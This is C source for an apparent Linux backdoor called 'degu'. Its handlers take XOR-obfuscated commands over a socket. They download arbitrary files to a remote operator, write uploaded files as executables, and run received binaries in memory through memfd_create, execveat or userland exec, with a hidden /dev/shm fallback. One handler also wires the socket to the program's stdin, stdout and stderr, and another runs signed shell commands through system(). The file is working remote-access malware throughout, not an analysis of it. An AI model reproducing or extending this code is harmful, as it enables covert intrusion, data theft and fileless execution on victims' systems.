#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <ctype.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>
#include <limits.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>

#include "degu.h"

int degu_ulexec(unsigned char *bin, char *argv[],size_t size){
    TRACE("running %s in ulexec",argv[0]);
    return reflect_execv(bin, argv,size);
}

int degu_memfd_create(char *name, int flags){

    int ret = syscall(319, name, flags);

    if (ret == -1){
        char file[] = "/dev/shm/.XXXXXX";
        ret = mkstemp(file);
        fchmod(ret, 0755);
        unlink(file);
        TRACE("memfd fallback %s fd=%i ", file, ret);
    }

   return ret;
}

int degu_execveat(int dirfd, char *pathname,char *argv[],
                  char *envp[], int flags){

    int ret = syscall(322, dirfd, pathname, argv, envp, flags);
    
    if (ret == -1){
        char cmd[4096] = {0};
        sprintf(cmd,"/proc/%i/fd/%i",getpid(),dirfd);
        TRACE("exec fallback %s ",cmd);
        ret = execve(cmd, argv, envp);
    }

   return ret;
}


int degu_send(int socket, unsigned char *ptr, size_t length){
    int total = length;
    while (length > 0){
        int i = send(socket, ptr, length, 0);
        if ( i < 0 ) return i;
        ptr += i;
        length -= i;
    }
    return total;
}

//|Oo<<|lenpath*4|path
void knock_handle_dl(int sock,unsigned  char *header,unsigned char *secret){
    unsigned char *cur = header + 4;

    int i;
    ssize_t lpath = cur[0] | (cur[1] << 8)
                | (cur[2] << 16) | (cur[3] << 24);

    ssize_t total_len = lpath + 4 + 4; // magic + len + str

    TRACE("in dl path total_len = %i len path = %i", total_len, lpath);

    if (total_len < 32)
        total_len = 32;

    unsigned char *payload = malloc( total_len * sizeof *payload );

    if(payload == NULL){
        return;
    }

    int r=0;
    while ( r < total_len ){
        i = recv(sock, payload + r, 32, 0);
        if( i <= 0) break;
        r+=i;
    }

    xdata(secret, payload, total_len);

    char *path = malloc(lpath + 1);
    if (!path) { 
        free(payload);
        return; 
    }
    memset(path, 0, lpath + 1);
    memcpy(path, payload + 8, lpath);

    TRACE("dl %s", path);
    int file = open(path, O_RDONLY);

    if( file < 0 ){
        free(path);
        free(payload);
        return; // send 404 ?
    }

    struct stat file_stat;
    int res = stat(path, &file_stat);

    TRACE("file_stat.st_size = %i res = %i ",file_stat.st_size, res);

    unsigned char flen[4];
    flen[0] = (file_stat.st_size >> 24) & 0xFF;
    flen[1] = (file_stat.st_size >> 16) & 0xFF;
    flen[2] = (file_stat.st_size >> 8) & 0xFF;
    flen[3] =  file_stat.st_size & 0xFF;

    unsigned int delta = 32 - ((file_stat.st_size + 4 ) % 32);

    unsigned char *response = malloc( file_stat.st_size + 4 + delta );
    if (!response) { 
        close(file);
        free(path);
        free(payload);
        return; 
    }
    memcpy(response, flen, 4);
    res = read(file, response + 4, file_stat.st_size);
    memset(response + 4 + file_stat.st_size , 0, delta);
    ssize_t reslen = file_stat.st_size + 4 + delta;
    TRACE("total len = %i ",reslen);

    xdata(secret, response, reslen);

    degu_send(sock, response, reslen);

    close(file);
    free(payload);
    free(path);
    free(response);

}

//|Oo>>|lendata*4|lenpath*4|path|data
void knock_handle_up(int sock,unsigned  char *header,unsigned char *secret){

    unsigned char *cur = header + 4;

    ssize_t ldata = cur[0] | (cur[1] << 8)
                | (cur[2] << 16) | (cur[3] << 24);

    cur += 4;

    ssize_t lpath = cur[0] | (cur[1] << 8)
                | (cur[2] << 16) | (cur[3] << 24);

    cur += 4;
    // header + lendata + lenpath == 12
    ssize_t total_len = ldata + lpath + 12;

    if ( total_len < 32 )
         total_len = 32;

    TRACE("total len %i ldata %i lpath %i", total_len, ldata, lpath );

    
    unsigned char *payload = malloc( total_len + total_len % 1024 + 1 );

    if( payload == NULL ){
        TRACE("error malloc %i", total_len + 1 );
        return;
    }
    
    unsigned int r=0;
    int i;

    while ( r < total_len ){
        i = recv(sock, payload + r, 1024, 0);
        if( i <= 0) break;
        r+=i;
    }

    xdata( secret, payload, total_len );

    char *path = malloc( lpath + 1 );
    if (!path) { 
        free(payload);
        return; 
    }
    memset( path, 0, lpath + 1 );

    memcpy( path, payload + 12, lpath );

    TRACE("up file = %s len data %i", path, ldata );

    int fd = open(path, O_CREAT|O_WRONLY, 0755);
    if ( fd < 0 ){
        free( payload );
        free( path );
        return;
    }
    write( fd, payload + 12 + lpath, ldata);
    close( fd );

    free( payload );
    free( path );
}

//|<o)~|len*4|lenargv*4|argc|argv|data 
void knock_handle_exe(int sock,unsigned  char *header,unsigned char *secret){

        unsigned char *cur = header + 4;
        int i;
        ssize_t lbin = cur[0] | (cur[1] << 8)
                    | (cur[2] << 16) | (cur[3] << 24);

        cur += 4;

        ssize_t largv = cur[0] | (cur[1] << 8)
                    | (cur[2] << 16) | (cur[3] << 24);

        cur += 4;

        // 13 == header + lenbin + lenargv + argc(<255)
        ssize_t total_len = lbin + largv + 13 ;
        TRACE("total_len = %i lbin = %i largv = %i ",total_len,lbin,largv);

        unsigned char *payload = malloc( total_len + 32 );

        if( !payload  ){
            TRACE("error malloc %i", total_len + 1 );
            return;
        }
        
        bzero(payload, total_len + 32 );

        int r=0;

        while ( r < total_len ){
            i = recv(sock, payload + r, 32, 0);
            if( i <= 0 ) break;
            r+=i;
        }

        xdata(secret, payload, total_len);

        unsigned char *bin = payload + 13 + largv;

        char * str_argv = malloc(largv + 1);
        if (!str_argv ){
            free( payload );
            return;
        }
        memset(str_argv, 0, largv + 1);
        memcpy(str_argv, payload + 13, largv);

        char **argv = NULL;
        int argc = 0;

        TRACE("argv=%s ",str_argv);

        char *tok = strtok(str_argv, " ");
        while (tok != NULL) {
            argv = realloc(argv, sizeof(char*) * (argc + 1));
            if (!argv){
                free(payload);
                free(str_argv);
                return;
            }
            argv[argc++] = tok;
            tok = strtok(NULL, " ");
        }

        argv = realloc(argv, sizeof(char*) * (argc + 1));
        if (!argv){
            free(payload);
            free(str_argv);
            return;
        }
        argv[argc] = NULL;
        
        for (int f=0;f<1024;f++)
            if (f != sock)
                close(f);
        
        dup2(sock,0);
        dup2(sock,1);
        dup2(sock,2);
        close(sock);
        
        int ret = 1;
        
        if (memcmp(DEGU_EXE_UL,header,4)==0){
            ret = degu_ulexec(bin,argv,lbin+1024);
            TRACE("trying ulexec %i",ret);
        }
        if(ret == 1){
            int fd = degu_memfd_create("", 1);
            TRACE("inside memfd exec  fd=%i",ret);
            write(fd, bin, lbin + 1024);
            degu_execveat(fd, "", argv, NULL, 0x1000); 
        }
        exit(EXIT_SUCCESS);
}


//rand[32]|len[2]|cmd[len]|sig[64]
void knock_ghost_exe(unsigned  char *buffer, size_t len){

    unsigned char *cmd = malloc( len + 1 ) ;
    if(!cmd){
        TRACE("unable to malloc cmd");
        return;
    }
    unsigned char *sig = malloc( 64 );
    if(!sig){
        TRACE("unable to malloc sig");
        free(cmd);
        return;
    }
    memset(cmd, 0, len + 1 );
    memcpy(cmd, buffer, len );
    memcpy(sig, buffer + len, 64 );

    unsigned int sigok = xvrfy(sig, cmd, len);

    if(sigok){
        TRACE("ghost exe : len %i cmd %s" , len, cmd);
        pid_t pid = -1;

        pid = fork();
        if(pid == -1){
            TRACE("fork error");
            free(cmd);
            free(sig);
            return;
        }
        if(pid == 0){
            int ret = system((char*)cmd);
            TRACE("system ret=%i", ret);
            exit(EXIT_SUCCESS);
        }else{
            signal(SIGCHLD,SIG_IGN);
        }
        free(cmd);
        free(sig);
        return;
    }

    free(cmd);
    free(sig);
}
